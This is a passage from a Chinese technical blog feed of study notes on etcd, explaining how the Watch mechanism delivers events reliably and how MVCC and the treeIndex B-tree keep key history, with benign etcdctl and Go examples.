hello -w=json <span class="hljs-comment">--rev=1</span><br>&#123;<br>    <span class="hljs-string">&quot;Events&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;kv&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;aGVsbG8=&quot;</span>,<br>                <span class="hljs-string">&quot;create_revision&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;mod_revision&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;d29ybGQx&quot;</span><br>            &#125;<br>        &#125;,<br>        &#123;<br>            <span class="hljs-string">&quot;kv&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;aGVsbG8=&quot;</span>,<br>                <span class="hljs-string">&quot;create_revision&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;mod_revision&quot;</span>:<span class="hljs-number">3</span>,<br>                <span class="hljs-string">&quot;version&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;d29ybGQy&quot;</span><br>            &#125;<br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;CompactRevision&quot;</span>:<span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;Canceled&quot;</span>:<span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;Created&quot;</span>:<span class="hljs-literal">false</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>从以上初体验中，可以看到，基于Watch特性，可以快速获取到你感兴趣的数据变化事件，这也是Kubernetes控制器工作的核心基础。在这过程中，其实有以下四大核心问题：</p><p><strong>第一，client获取事件的机制，etcd是使用轮询模式还是推送模式呢？两者各有什么优缺点？</strong></p><p><strong>第二，事件是如何存储的？ 会保留多久？watch命令中的版本号具有什么作用？</strong></p><p><strong>第三，当client和server端出现短暂网络波动等异常因素后，导致事件堆积时，server端会丢弃事件吗？若你监听的历史版本号server端不存在了，你的代码该如何处理？</strong></p><p><strong>第四，如果你创建了上万个watcher监听key变化，当server端收到一个写请求后，etcd是如何根据变化的key快速找到监听它的watcher呢？</strong></p><p>接下来分别详细聊聊etcd Watch特性是如何解决这四大问题的。搞懂这四个问题，就明白etcd甚至各类分布式存储Watch特性的核心实现原理了。</p><h2 id="轮询-vs-流式推送"><a href="#轮询-vs-流式推送" class="headerlink" title="轮询 vs 流式推送"></a>轮询 vs 流式推送</h2><p>首先第一个问题是 <strong>client获取事件机制</strong>，etcd是使用轮询模式还是推送模式呢？两者各有什么优缺点？</p><p>答案是两种机制etcd都使用过。</p><p>在etcd v2 Watch机制实现中，使用的是HTTP&#x2F;1.x协议，实现简单、兼容性好，每个watcher对应一个TCP连接。client通过HTTP&#x2F;1.1协议长连接定时轮询server，获取最新的数据变化事件。</p><p>然而当你的watcher成千上万的时，即使集群空负载，大量轮询也会产生一定的QPS，server端会消耗大量的socket、内存等资源，导致etcd的扩展性、稳定性无法满足Kubernetes等业务场景诉求。</p><p>etcd v3的Watch机制的设计实现并非凭空出现，它正是吸取了etcd v2的经验、教训而重构诞生的。</p><p>在etcd v3中，为了解决etcd v2的以上缺陷，使用的是基于HTTP&#x2F;2的gRPC协议，双向流的Watch API设计，实现了连接多路复用。</p><p>HTTP&#x2F;2协议为什么能实现多路复用呢？</p><p><img src="https://static001.geekbang.org/resource/image/be/74/be3a019beaf1310d214e5c9948cc9c74.png?wh=1784*534" alt="img"></p><p>在HTTP&#x2F;2协议中，HTTP消息被分解独立的帧（Frame），交错发送，帧是最小的数据单位。每个帧会标识属于哪个流（Stream），流由多个数据帧组成，每个流拥有一个唯一的ID，一个数据流对应一个请求或响应包。</p><p>如上图所示，client正在向server发送数据流5的帧，同时server也正在向client发送数据流1和数据流3的一系列帧。一个连接上有并行的三个数据流，HTTP&#x2F;2可基于帧的流ID将并行、交错发送的帧重新组装成完整的消息。</p><p>通过以上机制，HTTP&#x2F;2就解决了HTTP&#x2F;1的请求阻塞、连接无法复用的问题，实现了多路复用、乱序发送。</p><p>etcd基于以上介绍的HTTP&#x2F;2协议的多路复用等机制，实现了一个client&#x2F;TCP连接支持多gRPC Stream， 一个gRPC Stream又支持多个watcher，如下图所示。同时事件通知模式也从client轮询优化成server流式推送，极大降低了server端socket、内存等资源。</p><p><img src="https://static001.geekbang.org/resource/image/f0/be/f08d1c50c6bc14f09b5028095ce275be.png?wh=1804*1076" alt="img"></p><p>当然在etcd v3 watch性能优化的背后，也带来了Watch API复杂度上升, 不过你不用担心，etcd的clientv3库已经帮助你搞定这些棘手的工作了。</p><p>在clientv3库中，Watch特性被抽象成Watch、Close、RequestProgress三个简单API提供给开发者使用，屏蔽了client与gRPC WatchServer交互的复杂细节，实现了一个client支持多个gRPC Stream，一个gRPC Stream支持多个watcher，显著降低了你的开发复杂度。</p><p>同时当watch连接的节点故障，clientv3库支持自动重连到健康节点，并使用之前已接收的最大版本号创建新的watcher，避免旧事件回放等。</p><h2 id="滑动窗口-vs-MVCC"><a href="#滑动窗口-vs-MVCC" class="headerlink" title="滑动窗口 vs MVCC"></a>滑动窗口 vs MVCC</h2><p>介绍完etcd v2的轮询机制和etcd v3的流式推送机制后，再看第二个问题，事件是如何存储的？ 会保留多久呢？watch命令中的版本号具有什么作用？</p><p>第二个问题的本质是 <strong>历史版本存储</strong>，etcd经历了从滑动窗口到MVCC机制的演变，滑动窗口是仅保存有限的最近历史版本到内存中，而MVCC机制则将历史版本保存在磁盘中，避免了历史版本的丢失，极大的提升了Watch机制的可靠性。</p><p>etcd v2滑动窗口是如何实现的？它有什么缺点呢？</p><p>它使用的是如下一个简单的环形数组来存储历史事件版本，当key被修改后，相关事件就会被添加到数组中来。若超过eventQueue的容量，则淘汰最旧的事件。在etcd v2中，eventQueue的容量是固定的1000，因此它最多只会保存1000条事件记录，不会占用大量etcd内存导致etcd OOM。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-keyword">type</span> <span class="hljs-type">EventHistory</span> struct &#123;<br>   <span class="hljs-type">Queue</span>      eventQueue<br>   <span class="hljs-type">StartIndex</span> uint64<br>   <span class="hljs-type">LastIndex</span>  uint64<br>   rwl        sync.<span class="hljs-type">RWMutex</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是它的缺陷显而易见的，固定的事件窗口只能保存有限的历史事件版本，是不可靠的。当写请求较多的时候、client与server网络出现波动等异常时，很容易导致事件丢失，client不得不触发大量的expensive查询操作，以获取最新的数据及版本号，才能持续监听数据。</p><p>特别是对于重度依赖Watch机制的Kubernetes来说，显然是无法接受的。因为这会导致控制器等组件频繁的发起expensive List Pod等资源操作，导致APIServer&#x2F;etcd出现高负载、OOM等，对稳定性造成极大的伤害。</p><p>etcd v3的MVCC机制，正如上一节课所介绍的，就是为解决etcd v2 Watch机制不可靠而诞生。相比etcd v2直接保存事件到内存的环形数组中，etcd v3则是将一个key的历史修改版本保存在boltdb里面。boltdb是一个基于磁盘文件的持久化存储，因此它重启后历史事件不像etcd v2一样会丢失，同时你可通过配置压缩策略，来控制保存的历史版本数，在压缩篇我会和你详细讨论它。</p><p>最后watch命令中的版本号具有什么作用呢?</p><p>在上一节课中我们深入介绍了它的含义，版本号是etcd逻辑时钟，当client因网络等异常出现连接闪断后，通过版本号，它就可从server端的boltdb中获取错过的历史事件，而无需全量同步，它是etcd Watch机制数据增量同步的核心。</p><h2 id="可靠的事件推送机制"><a href="#可靠的事件推送机制" class="headerlink" title="可靠的事件推送机制"></a>可靠的事件推送机制</h2><p>再看第三个问题，当client和server端出现短暂网络波动等异常因素后，导致事件堆积时，server端会丢弃事件吗？若你监听的历史版本号server端不存在了，你的代码该如何处理？</p><p>第三个问题的本质是 <strong>可靠事件推送机制</strong>，要搞懂它，我们就得弄懂etcd Watch特性的整体架构、核心流程，下图是Watch特性整体架构图。</p><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p><img src="https://static001.geekbang.org/resource/image/42/bf/42575d8d0a034e823b8e48d4ca0a49bf.png?wh=1920*1075" alt="img"></p><p>通过上面的架构图，简要介绍下一个watch请求流程，对全流程有个整体的认识。</p><p>当你通过etcdctl或API发起一个watch key请求的时候，etcd的gRPCWatchServer收到watch请求后，会创建一个serverWatchStream, 它负责接收client的gRPC Stream的create&#x2F;cancel watcher请求(recvLoop goroutine)，并将从MVCC模块接收的Watch事件转发给client(sendLoop goroutine)。</p><p>当serverWatchStream收到create watcher请求后，serverWatchStream会调用MVCC模块的WatchStream子模块分配一个watcher id，并将watcher注册到MVCC的WatchableKV模块。</p><p>在etcd启动的时候，WatchableKV模块会运行syncWatchersLoop和syncVictimsLoop goroutine，分别负责不同场景下的事件推送，它们也是Watch特性可靠性的核心之一。</p><p>从架构图中你可以看到Watch特性的核心实现是WatchableKV模块，下面我就为你抽丝剥茧，看看”etcdctl watch hello -w&#x3D;json –rev&#x3D;1”命令在WatchableKV模块是如何处理的？面对各类异常，它如何实现可靠事件推送？</p><p><strong>etcd核心解决方案是复杂度管理，问题拆分。</strong></p><p>etcd根据不同场景，对问题进行了分解，将watcher按场景分类，实现了轻重分离、低耦合。我首先给你介绍下synced watcher、unsynced watcher它们各自的含义。</p><p><strong>synced watcher</strong>，顾名思义，表示此类watcher监听的数据都已经同步完毕，在等待新的变更。</p><p>如果你创建的watcher未指定版本号(默认0)、或指定的版本号大于etcd sever当前最新的版本号(currentRev)，那么它就会保存到synced watcherGroup中。watcherGroup负责管理多个watcher，能够根据key快速找到监听该key的一个或多个watcher。</p><p><strong>unsynced watcher</strong>，表示此类watcher监听的数据还未同步完成，落后于当前最新数据变更，正在努力追赶。</p><p>如果你创建的watcher指定版本号小于etcd server当前最新版本号，那么它就会保存到unsynced watcherGroup中。比如我们的这个案例中watch带指定版本号1监听时，版本号1和etcd server当前版本之间的数据并未同步给你，因此它就属于此类。</p><p>从以上介绍中，我们可以将可靠的事件推送机制拆分成最新事件推送、异常场景重试、历史事件推送机制三个子问题来进行分析。</p><p>下面是第一个子问题，最新事件推送机制。</p><h3 id="最新事件推送机制"><a href="#最新事件推送机制" class="headerlink" title="最新事件推送机制"></a>最新事件推送机制</h3><p>当etcd收到一个写请求，key-value发生变化的时候，处于syncedGroup中的watcher，是如何获取到最新变化事件并推送给client的呢？</p><p><img src="https://static001.geekbang.org/resource/image/5y/48/5yy0cbf2833c438812086287d2ebf948.png?wh=1920*1060" alt="img"></p><p>当创建完成watcher后，此时你执行put hello修改操作时，如上图所示，请求经过KVServer、Raft模块后Apply到状态机时，在MVCC的put事务中，它会将本次修改的后的mvccpb.KeyValue保存到一个changes数组中。</p><p>在put事务结束时，如下面的精简代码所示，它会将KeyValue转换成Event事件，然后回调watchableStore.notify函数（流程5）。notify会匹配出监听过此key并处于synced watcherGroup中的watcher，同时事件中的版本号要大于等于watcher监听的最小版本号，才能将事件发送到此watcher的事件channel中。</p><p>serverWatchStream的sendLoop goroutine监听到channel消息后，读出消息立即推送给client（流程6和7），至此，完成一个最新修改事件推送。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">evs := <span class="hljs-built_in">make</span>(<span class="hljs-selector-attr">[]</span>mvccpb<span class="hljs-selector-class">.Event</span>, <span class="hljs-built_in">len</span>(changes))<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span>, change := range changes &#123;<br>   evs<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-class">.Kv</span> = &amp;changes<span class="hljs-selector-attr">[i]</span><br>   <span class="hljs-keyword">if</span> change<span class="hljs-selector-class">.CreateRevision</span> == <span class="hljs-number">0</span> &#123;<br>      evs<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-class">.Type</span> = mvccpb<span class="hljs-selector-class">.DELETE</span><br>      evs<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-class">.Kv</span><span class="hljs-selector-class">.ModRevision</span> = rev<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>      evs<span class="hljs-selector-attr">[i]</span><span class="hljs-selector-class">.Type</span> = mvccpb<span class="hljs-selector-class">.PUT</span><br>   &#125;<br>&#125;<br>tw<span class="hljs-selector-class">.s</span><span class="hljs-selector-class">.notify</span>(rev, evs)<br><br></code></pre></td></tr></table></figure><p>注意接收Watch事件channel的buffer容量默认1024(etcd v3.4.9)。若client与server端因网络波动、高负载等原因导致推送缓慢，buffer满了，事件会丢失吗？</p><p>这就是第二个子问题，异常场景的重试机制。</p><h3 id="异常场景重试机制"><a href="#异常场景重试机制" class="headerlink" title="异常场景重试机制"></a>异常场景重试机制</h3><p>若出现channel buffer满了，etcd为了保证Watch事件的高可靠性，并不会丢弃它，而是将此watcher从synced watcherGroup中删除，然后将此watcher和事件列表保存到一个名为受害者victim的watcherBatch结构中，通过 <strong>异步机制重试</strong> 保证事件的可靠性。</p><p>还有一个点需要注意的是，notify操作它是在修改事务结束时同步调用的，必须是轻量级、高性能、无阻塞的，否则会严重影响集群写性能。</p><p>那么若因网络波动、CPU高负载等异常导致watcher处于victim集合中后，etcd是如何处理这种slow watcher呢？</p><p>在介绍Watch机制整体架构时，我们知道WatchableKV模块会启动两个异步goroutine，其中一个是syncVictimsLoop，正是它负责slower watcher的堆积的事件推送。</p><p>它的基本工作原理是，遍历victim watcherBatch数据结构，尝试将堆积的事件再次推送到watcher的接收channel中。若推送失败，则再次加入到victim watcherBatch数据结构中等待下次重试。</p><p>若推送成功，watcher监听的最小版本号(minRev)小于等于server当前版本号(currentRev)，说明可能还有历史事件未推送，需加入到unsynced watcherGroup中，由下面介绍的历史事件推送机制，推送minRev到currentRev之间的事件。</p><p>若watcher的最小版本号大于server当前版本号，则加入到synced watcher集合中，进入上面介绍的最新事件通知机制。</p><p>下面我给你画了一幅图总结各类watcher状态转换关系，希望能帮助你快速厘清之间关系。</p><p><img src="https://static001.geekbang.org/resource/image/40/8e/40ec1087113edfc9f7yy0f32394b948e.png?wh=1920*1065" alt="img"></p><p>介绍完最新事件推送、异常场景重试机制后，那历史事件推送机制又是怎么工作的呢？</p><h3 id="历史事件推送机制"><a href="#历史事件推送机制" class="headerlink" title="历史事件推送机制"></a>历史事件推送机制</h3><p>WatchableKV模块的另一个goroutine，syncWatchersLoop，正是负责unsynced watcherGroup中的watcher历史事件推送。</p><p>在历史事件推送机制中，如果你监听老的版本号已经被etcd压缩了，client该如何处理？</p><p>要了解这个问题，我们就得搞清楚syncWatchersLoop如何工作，它的核心支撑是boltdb中存储了key-value的历史版本。</p><p>syncWatchersLoop，它会遍历处于unsynced watcherGroup中的每个watcher，为了优化性能，它会选择一批unsynced watcher批量同步，找出这一批unsynced watcher中监听的最小版本号。</p><p>因boltdb的key是按版本号存储的，因此可通过指定查询的key范围的最小版本号作为开始区间，当前server最大版本号作为结束区间，遍历boltdb获得所有历史数据。</p><p>然后将KeyValue结构转换成事件，匹配出监听过事件中key的watcher后，将事件发送给对应的watcher事件接收channel即可。发送完成后，watcher从unsynced watcherGroup中移除、添加到synced watcherGroup中，如下面的watcher状态转换图黑色虚线框所示。</p><p><img src="https://static001.geekbang.org/resource/image/a7/b4/a7a04846de2be66f1162af8845b13ab4.png?wh=1920*1098" alt="img"></p><p>若watcher监听的版本号已经小于当前etcd server压缩的版本号，历史变更数据就可能已丢失，因此etcd server会返回ErrCompacted错误给client。client收到此错误后，需重新获取数据最新版本号后，再次Watch。你在业务开发过程中，使用Watch API最常见的一个错误之一就是未处理此错误。</p><h2 id="高效的事件匹配"><a href="#高效的事件匹配" class="headerlink" title="高效的事件匹配"></a>高效的事件匹配</h2><p>介绍完可靠的事件推送机制后，最后我们再看第四个问题，如果你创建了上万个watcher监听key变化，当server端收到一个写请求后，etcd是如何根据变化的key快速找到监听它的watcher呢？一个个遍历watcher吗？</p><p>显然一个个遍历watcher是最简单的方法，但是它的时间复杂度是O(N)，在watcher数较多的场景下，会导致性能出现瓶颈。更何况etcd是在执行一个写事务结束时，同步触发事件通知流程的，若匹配watcher开销较大，将严重影响etcd性能。</p><p>那使用什么数据结构来快速查找哪些watcher监听了一个事件中的key呢？</p><p>也许你会说使用map记录下哪些watcher监听了什么key不就可以了吗？ etcd的确使用<strong>map</strong>记录了监听单个key的watcher，但是你要注意的是Watch特性不仅仅可以监听单key，它还可以指定监听key范围、key前缀，因此etcd还使用了如下的<strong>区间树</strong>。</p><p><img src="https://static001.geekbang.org/resource/image/5a/88/5ae0a99629021e4a05c08yyd0df92f88.png?wh=1920*1040" alt="img"></p><p>当收到创建watcher请求的时候，它会把watcher监听的key范围插入到上面的区间树中，区间的值保存了监听同样key范围的watcher集合&#x2F;watcherSet。</p><p>当产生一个事件时，etcd首先需要从map查找是否有watcher监听了单key，其次它还需要从区间树找出与此key相交的所有区间，然后从区间的值获取监听的watcher集合。</p><p><strong>区间树支持快速查找一个key是否在某个区间内，时间复杂度O(LogN)，因此etcd基于map和区间树实现了watcher与事件快速匹配，具备良好的扩展性。</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>提出了Watch特性设计实现的四个核心问题，分别是<strong>获取事件机制、事件历史版本存储、如何实现可靠的事件推送机制、如何高效的将事件与watcher进行匹配。</strong></p><p>在获取事件机制、事件历史版本存储两个问题中，我给你介绍了etcd v2在使用HTTP&#x2F;1.x轮询、滑动窗口时，存在大量的连接数、丢事件等问题，导致扩展性、稳定性较差。</p><p>而etcd v3 Watch特性优化思路是基于HTTP&#x2F;2的流式传输、多路复用，实现了一个连接支持多个watcher，减少了大量连接数，事件存储也从滑动窗口优化成稳定可靠的MVCC机制，历史版本保存在磁盘中，具备更好的扩展性、稳定性。</p><p>在实现可靠的事件推送机制问题中，我通过一个整体架构图带你了解整个Watch机制的核心链路，数据推送流程。</p><p>Watch特性的核心实现模块是watchableStore，它通过将watcher划分为synced&#x2F;unsynced&#x2F;victim三类，将问题进行了分解，并通过多个后台异步循环 goroutine负责不同场景下的事件推送，提供了各类异常等场景下的Watch事件重试机制，尽力确保变更事件不丢失、按逻辑时钟版本号顺序推送给client。</p><p>最后一个事件匹配性能问题，etcd基于map和区间树数实现了watcher与事件快速匹配，保障了大规模场景下的Watch机制性能和读写稳定性。</p>]]></content>
    
    
    <categories>
      
      <category>etcd</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>etcd</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>07.MVCC：etcd如何实现多版本并发控制？</title>
    <link href="/2022/10/04/07-MVCC%EF%BC%9Aetcd%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%EF%BC%9F/"/>
    <url>/2022/10/04/07-MVCC%EF%BC%9Aetcd%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%89%88%E6%9C%AC%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="07-MVCC：如何实现多版本并发控制？"><a href="#07-MVCC：如何实现多版本并发控制？" class="headerlink" title="07.MVCC：如何实现多版本并发控制？"></a>07.MVCC：如何实现多版本并发控制？</h1><blockquote><p>本文笔记来自：「极客时间ETCD实战课」，原文链接：<a href="https://time.geekbang.org/column/article/354292?cid=100069901">https://time.geekbang.org/column/article/354292?cid=100069901</a></p></blockquote><p>etcd v2时，存在若干局限，如仅保留最新版本key-value数据、丢弃历史版本。而<strong>etcd核心特性watch又依赖历史版本</strong>（为什么watch机制依赖历史版本），因此etcd v2为了缓解这个问题，会在内存中维护一个较短的全局事件滑动窗口，保留最近的1000条变更事件。但是在集群写请求较多等场景下，它依然无法提供可靠的Watch机制。</p><p>那么不可靠的etcd v2事件机制，在etcd v3中是如何解决的呢？</p><p>今天分享的MVCC（Multiversion concurrency control）机制，正是为解决这个问题而诞生的。</p><p>MVCC机制的核心思想是保存一个key-value数据的多个历史版本，etcd基于它不仅实现了可靠的Watch机制，避免了client频繁发起List Pod等expensive request操作，保障etcd集群稳定性。而且MVCC还能以较低的并发控制开销，实现各类隔离级别的事务，保障事务的安全性，是事务特性的基础。</p><h2 id="什么是MVCC"><a href="#什么是MVCC" class="headerlink" title="什么是MVCC"></a>什么是MVCC</h2><p>首先什么是MVCC，从名字上理解，它是一个基于多版本技术实现的一种并发控制机制。那常见的并发机制有哪些？MVCC的优点在哪里呢？</p><p>提到并发控制机制你可能就没那么陌生了，比如数据库中的悲观锁，也就是通过锁机制确保同一时刻只能有一个事务对数据进行修改操作，常见的实现方案有读写锁、互斥锁、两阶段锁等。</p><p>悲观锁是一种事先预防机制，它悲观地认为多个并发事务可能会发生冲突，因此它要求事务必须先获得锁，才能进行修改数据操作。但是悲观锁粒度过大、高并发场景下大量事务会阻塞等，会导致服务性能较差。</p><p><strong>MVCC机制正是基于多版本技术实现的一种乐观锁机制</strong>，它乐观地认为数据不会发生冲突，但是当事务提交时，具备检测数据是否冲突的能力。</p><p>在MVCC数据库中，你更新一个key-value数据的时候，它并不会直接覆盖原数据，而是新增一个版本来存储新的数据，每个数据都有一个版本号。版本号它是一个逻辑时间，为了方便你深入理解版本号意义，在下面我给你画了一个etcd MVCC版本号时间序列图。</p><p>从图中你可以看到，随着时间增长，你每次修改操作，版本号都会递增。每修改一次，生成一条新的数据记录。 <strong>当指定版本号读取数据时，它实际上访问的是版本号生成那个时间点的快照数据</strong>。当删除数据的时候，它实际也是新增一条带删除标识的数据记录。</p><p><img src="https://static001.geekbang.org/resource/image/1f/2c/1fbf4aa426c8b78570ed310a8c9e2c2c.png?wh=1920*806" alt="img"></p><h2 id="MVCC特性初体验"><a href="#MVCC特性初体验" class="headerlink" title="MVCC特性初体验"></a>MVCC特性初体验</h2><p>了解完什么是MVCC后，先通过几个简单命令，体验下MVCC特性，看看它是如何查询历史修改记录，以及找回不小心删除的key的。</p><p>启动一个空集群，更新两次key hello后，如何获取key hello的上一个版本值呢？ 删除key hello后，还能读到历史版本吗?</p><p>如下面的命令所示，第一次key hello更新完后，通过get命令获取下它的key-value详细信息。除了key、value信息，还有各类版本号这里关于mod_revision字段，它表示key最后一次修改时的etcd版本号。</p><p>当我们再次更新key hello为world2后，然后通过查询时指定key第一次更新后的版本号，会发现我们查询到了第一次更新的值，甚至我们执行删除key hello后，依然可以获得到这个值。那么etcd是如何实现的呢?</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 更新key hello为world1</span><br>$ etcdctl put hello world1<br>OK<br><span class="hljs-comment"># 通过指定输出模式为json,查看key hello更新后的详细信息</span><br>$ etcdctl <span class="hljs-built_in">get</span> hello <span class="hljs-attribute">-w</span>=json<br>&#123;<br>    <span class="hljs-string">&quot;kvs&quot;</span>:[<br>        &#123;<br>            <span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&quot;aGVsbG8=&quot;</span>,<br>            <span class="hljs-string">&quot;create_revision&quot;</span>:2,<br>            <span class="hljs-string">&quot;mod_revision&quot;</span>:2,<br>            <span class="hljs-string">&quot;version&quot;</span>:1,<br>            <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;d29ybGQx&quot;</span><br>        &#125;<br>    ],<br>    <span class="hljs-string">&quot;count&quot;</span>:1<br>&#125;<br><span class="hljs-comment"># 再次修改key hello为world2</span><br>$ etcdctl put hello world2<br>OK<br><span class="hljs-comment"># 确认修改成功,最新值为wolrd2</span><br>$ etcdctl <span class="hljs-built_in">get</span> hello<br>hello<br>world2<br><span class="hljs-comment"># 指定查询版本号,获得了hello上一次修改的值</span><br>$ etcdctl <span class="hljs-built_in">get</span> hello <span class="hljs-attribute">--rev</span>=2<br>hello<br>world1<br><span class="hljs-comment"># 删除key hello</span><br>$ etcdctl del  hello<br>1<br><span class="hljs-comment"># 删除后指定查询版本号3,获得了hello删除前的值</span><br>$ etcdctl <span class="hljs-built_in">get</span> hello <span class="hljs-attribute">--rev</span>=3<br>hello<br>world2<br><br></code></pre></td></tr></table></figure><h2 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h2><p>在详细介绍etcd如何实现MVCC特性前，从整体上介绍下MVCC模块。下图是MVCC模块的一个整体架构图，整个MVCC特性由treeIndex、Backend&#x2F;boltdb组成。</p><p>当你执行MVCC特性初体验中的put命令后，请求经过gRPC KV Server、Raft模块流转，对应的日志条目被提交后，Apply模块开始执行此日志内容。</p><p><img src="https://static001.geekbang.org/resource/image/f5/2c/f5799da8d51a381527068a95bb13592c.png?wh=1920*1064" alt="img"></p><p>Apply模块通过MVCC模块来执行put请求，持久化key-value数据。MVCC模块将请求请划分成两个类别，分别是读事务（ReadTxn）和写事务（WriteTxn）。读事务负责处理range请求，写事务负责put&#x2F;delete操作。读写事务基于treeIndex、Backend&#x2F;boltdb提供的能力，实现对key-value的增删改查功能。</p><p>treeIndex模块基于内存版B-tree实现了key索引管理，它保存了用户key与版本号（revision）的映射关系等信息。</p><p>Backend模块负责etcd的key-value持久化存储，主要由ReadTx、BatchTx、Buffer组成，ReadTx定义了抽象的读事务接口，BatchTx在ReadTx之上定义了抽象的写事务接口，Buffer是数据缓存区。</p><p>etcd设计上支持多种Backend实现，目前实现的Backend是boltdb。boltdb是一个基于B+ tree实现的、支持事务的key-value嵌入式数据库。</p><p>treeIndex与boltdb关系你可参考下图。当你发起一个get hello命令时，从treeIndex中获取key的版本号，然后再通过这个版本号，从boltdb获取value信息。boltdb的value是包含用户key-value、各种版本号、lease信息的结构体。</p><p><img src="https://static001.geekbang.org/resource/image/e7/8f/e713636c6cf9c46c7c19f677232d858f.png?wh=1920*903" alt="img"></p><p>接下来重点聊聊treeIndex模块的原理与核心数据结构。</p><h2 id="treeIndex原理"><a href="#treeIndex原理" class="headerlink" title="treeIndex原理"></a>treeIndex原理</h2><p>为什么需要treeIndex模块呢?</p><p>对于etcd v2来说，当你通过etcdctl发起一个put hello操作时，etcd v2直接更新内存树，这就导致历史版本直接被覆盖，无法支持保存key的历史版本。在etcd v3中引入treeIndex模块正是为了解决这个问题，<strong>支持保存key的历史版本，提供稳定的Watch机制和事务隔离等能力。</strong></p><p><strong>那etcd v3又是如何基于treeIndex模块，实现保存key的历史版本的呢?</strong></p><p>etcd在每次修改key时会生成一个全局递增的版本号（revision），然后通过数据结构B-tree保存用户key与版本号之间的关系，再以版本号作为boltdb key，以用户的key-value等信息作为boltdb value，保存到boltdb。</p><p><strong>etcd保存用户key与版本号映射关系的数据结构B-tree，为什么etcd使用它而不使用哈希表、平衡二叉树？</strong></p><p>从etcd的功能特性上分析， 因etcd支持范围查询，因此保存索引的数据结构也必须支持范围查询才行。所以哈希表不适合，而B-tree支持范围查询。</p><p>从性能上分析，平横二叉树每个节点只能容纳一个数据、导致树的高度较高，而B-tree每个节点可以容纳多个数据，树的高度更低，更扁平，涉及的查找次数更少，具有优越的增、删、改、查性能。</p><p>Google的开源项目btree，使用Go语言实现了一个内存版的B-tree，对外提供了简单易用的接口。etcd正是基于btree库实现了一个名为treeIndex的索引模块，通过它来查询、保存用户key与版本号之间的关系。</p><p>下图是个最大度（degree &gt; 1，简称d）为5的B-tree，度是B-tree中的一个核心参数，它决定了你每个节点上的数据量多少、节点的“胖”、“瘦”程度。</p><p>从图中你可以看到，节点越胖，意味着一个节点可以存储更多数据，树的高度越低。在一个度为d的B-tree中，节点保存的最大key数为2d - 1，否则需要进行平衡、分裂操作。这里你要注意的是在etcd treeIndex模块中，创建的是最大度32的B-tree，也就是一个叶子节点最多可以保存63个key。</p><p><img src="https://static001.geekbang.org/resource/image/44/74/448c8a2bb3b5d2d48dfb6ea585172c74.png?wh=1920*934" alt="img"></p><p>从图中可以看到，你通过put&#x2F;txn命令写入的一系列key，treeIndex模块基于B-tree将其组织起来，节点之间基于用户key比较大小。当你查找一个key k95时，通过B-tree的特性，你仅需通过图中流程1和2两次快速比较，就可快速找到k95所在的节点。</p><p>在treeIndex中，每个节点的key是一个keyIndex结构，etcd就是通过它保存了用户的key与版本号的映射关系。</p><p>那么keyIndex结构包含哪些信息呢？下面是字段说明，可以参考一下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span 